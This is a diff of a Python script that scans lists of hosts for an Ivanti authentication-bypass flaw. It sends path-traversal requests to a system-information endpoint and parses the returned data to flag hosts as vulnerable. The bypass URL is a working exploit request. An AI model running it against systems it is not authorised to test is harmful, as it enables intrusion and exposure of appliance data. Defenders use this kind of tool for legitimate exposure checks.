@@ -18,77 +18,89 @@ except ImportError:
 # Disable warnings for unverified HTTPS requests
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Global set to store vulnerable targets
-vulnerable_targets = set()
 
-
-def check_system_info(host, port, user_agent):
-    protocol = "http" if port == 80 else "https"
-    url = f"{protocol}://{host}/api/v1/totp/user-backup-code/../../system/system-information"
+def check_system_info(host, protocol, port, user_agent):
+    url = f"{protocol}://{host}:{port}/api/v1/totp/user-backup-code/../../system/system-information"
     headers = {"User-Agent": user_agent}
 
     try:
         res = requests.get(url, headers=headers, verify=False, timeout=5)
         if res.status_code == 200:
-            return "Vulnerable"
+            try:
+                json_data = res.json()
+                if "key_name" in json_data:
+                    return f"Vulnerable: {json_data['key_name']}"
+                else:
+                    return "Not Vulnerable (Key Not Found)"
+            except ValueError:
+                return "Invalid JSON Response"
+        elif res.status_code == 403:
+            return "Not Vulnerable (403 Forbidden)"
         else:
-            return "Not Vulnerable"
-    except requests.exceptions.RequestException:
-        return "Check Failed"
+            return f"HTTP Error: {res.status_code}"
+    except requests.exceptions.RequestException as e:
+        return f"Network Issue"
+        # More Verbose: return f"Network Issue: {e}"
 
 
-def check_bypass_vulnerability(host, port, user_agent):
-    protocol = "http" if port == 80 else "https"
-    bypass_url = f"{protocol}://{host}/api/v1/totp/user-backup-code/../../system/system-information"
+def check_bypass_vulnerability(host, protocol, port, user_agent):
+    bypass_url = f"{protocol}://{host}:{port}/api/v1/totp/user-backup-code/../../system/system-information"
     headers = {"User-Agent": user_agent}
 
     try:
         res = requests.get(bypass_url, headers=headers, verify=False, timeout=5)
         if res.status_code == 200:
-            return "Vulnerable"
+            try:
+                json_data = res.json()
+                if "key_name" in json_data:
+                    return f"Vulnerable: {json_data['key_name']}"
+                else:
+                    return "Not Vulnerable (Key Not Found)"
+            except ValueError:
+                return "Invalid JSON Response"
+        elif res.status_code == 403:
+            return "Not Vulnerable (403 Forbidden)"
         else:
-            return "Not Vulnerable"
-    except requests.exceptions.RequestException:
-        return "Network Issue"
+            return f"HTTP Error: {res.status_code}"
+    except requests.exceptions.RequestException as e:
+        return f"Network Issue"
+        # More Verbose: return f"Network Issue: {e}"
 
 
-def check_host(host, port, user_agent):
+def check_web_access(host, protocol, port, user_agent):
     secure_phrase = "Access to the Web site is blocked by your administrator"
-    protocol = "http" if port == 80 else "https"
-    web_url = f"{protocol}://{host}/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"
+    web_url = f"{protocol}://{host}:{port}/api/v1/configuration/users/user-roles/user-role/rest-userrole1/web/web-bookmarks/bookmark"
     headers = {"User-Agent": user_agent}
 
     try:
         r = requests.get(web_url, headers=headers, verify=False, timeout=5)
         if r.status_code == 403 and len(r.content) == 0:
-            web_access_status = "Vulnerable"
+            return "Vulnerable"
         elif secure_phrase in r.text:
-            web_access_status = "Not Vulnerable"
+            return "Not Vulnerable"
         elif r.status_code != 200:
-            web_access_status = f"HTTP Error: {r.status_code}"
+            return f"HTTP Error: {r.status_code}"
         else:
-            web_access_status = "Ivanti Presence Inconclusive"
+            return "Ivanti Presence Inconclusive"
     except requests.exceptions.ConnectionError:
-        web_access_status = "Network Issue"
+        return "Network Issue"
     except requests.exceptions.Timeout:
-        web_access_status = "Timeout Error"
+        return "Timeout Error"
     except requests.exceptions.RequestException as e:
-        web_access_status = "Connection Error"
+        return "Connection Error"
 
-    system_info_status = check_system_info(host, port, user_agent)
-    bypass_status = check_bypass_vulnerability(host, port, user_agent)
-    # Add the host:port to vulnerable_targets if any status is "Vulnerable"
-    if "Vulnerable" in [web_access_status, system_info_status, bypass_status]:
-        vulnerable_targets.add(f"{host}:{port}")
 
+def check_host(host, protocol, port, user_agent):
+    web_access_status = check_web_access(host, protocol, port, user_agent)
+    system_info_status = check_system_info(host, protocol, port, user_agent)
+    bypass_status = check_bypass_vulnerability(host, protocol, port, user_agent)
     return host, port, web_access_status, system_info_status, bypass_status
 
 
 def strip_protocol_and_dedupe(results):
     cleaned_results = {}
     for host, port, web_access_status, system_info_status, bypass_status in results:
-        stripped_host = host.replace("https://", "").replace("http://", "")
-        key = (stripped_host, port)
+        key = (host, port)
         combined_status = f"{web_access_status}; {system_info_status}; {bypass_status}"
         if key not in cleaned_results:
             cleaned_results[key] = combined_status
@@ -99,20 +111,13 @@ def strip_protocol_and_dedupe(results):
 
 def count_statuses(results):
     status_counts = {}
-    target_status_map = {}
-    for (host, port), combined_status in results.items():
+    for _, combined_status in results.items():
         statuses = combined_status.split("; ")
         for status in statuses:
-            target_key = f"{host}:{port}"
-            status_key = f"{target_key}-{status}"
-            if (
-                status_key not in target_status_map
-            ):  # Check if this target-status combination is already counted
-                target_status_map[status_key] = True
-                if status not in status_counts:
-                    status_counts[status] = 1
-                else:
-                    status_counts[status] += 1
+            if status not in status_counts:
+                status_counts[status] = 1
+            else:
+                status_counts[status] += 1
     return status_counts
 
 
@@ -125,18 +130,14 @@ def print_status(
         color_map = {
             "Not Vulnerable": Fore.GREEN,
             "Vulnerable": Fore.RED,
-            "HTTP Error": Fore.YELLOW,  # This can be used as a general color for all HTTP errors
+            "HTTP Error": Fore.YELLOW,
             "Network Issue": Fore.BLUE,
             "Timeout Error": Fore.MAGENTA,
             "Connection Error": Fore.MAGENTA,
             "Ivanti Presence Inconclusive": Fore.CYAN,
-            "Vulnerable (Bypass Detected)": Fore.RED,
+            "Invalid JSON Response": Fore.YELLOW,
         }
-
-        # Use the entire status string to fetch the color
-        color = color_map.get(
-            status.split(":")[0], ""
-        )  # Splits the status and gets the first part for matching
+        color = color_map.get(status.split(":")[0], "")
         return color + status + Style.RESET_ALL if color_enabled else status
 
     print(f"    Web Access:      {colored_status(web_access_status)}")
@@ -156,6 +157,13 @@ def main():
         "-i", "--input", required=False, help="Input file containing the list of hosts"
     )
     parser.add_argument("-u", "--url", required=False, help="Single URL to test")
+    parser.add_argument(
+        "-pr",
+        "--protocol",
+        required=False,
+        default="http",
+        help="Protocol (http or https)",
+    )
     parser.add_argument(
         "-p",
         "--ports",
@@ -184,7 +192,6 @@ def main():
     )
     args = parser.parse_args()
 
-    # Default output directory and file name
     default_output_dir = "./results"
     default_output_file = datetime.now().strftime("%Y%m%d_%H%M%S") + "_results.csv"
     output_path = (
@@ -193,14 +200,13 @@ def main():
         else args.output
     )
 
-    # Create the output directory if it does not exist
     if not os.path.exists(default_output_dir):
         os.makedirs(default_output_dir)
 
     results = []
     if args.url:
         for port in args.ports:
-            result = check_host(args.url, port, args.user_agent)
+            result = check_host(args.url, args.protocol, port, args.user_agent)
             results.append(result)
             print_status(
                 result[0],
@@ -220,7 +226,7 @@ def main():
                 for host in hosts_list:
                     for port in args.ports:
                         future = executor.submit(
-                            check_host, host, port, args.user_agent
+                            check_host, host, args.protocol, port, args.user_agent
                         )
                         futures.append(future)
 
@@ -240,7 +246,8 @@ def main():
             print(f"Error: File '{args.input}' not found.")
             return
         except Exception as e:
-            print(f"Error: An unexpected error occurred - {e}")
+            print(f"Error: An unexpected error occurred")
+            # More Verbose: print(f"Error: An unexpected error occurred: {e}")
             return
     else:
         print("Please provide either a URL with -u/--url or a file with -i/--input.")
@@ -264,18 +271,11 @@ def main():
             )
 
     status_counts = count_statuses(cleaned_results)
-    print("\nUnique Target Counts by Status:")
+    print("\nStatus Counts:")
     for status, count in status_counts.items():
         print(f"{status}: {count}")
 
-    if vulnerable_targets:
-        print("\nVulnerable Targets:")
-        for target in vulnerable_targets:
-            print(target)
-    else:
-        print("\nNo Vulnerable Targets Detected")
-
-    print(f"\n\nResults written to {output_path}")
+    print(f"Results written to {output_path}")
 
 
 if __name__ == "__main__":
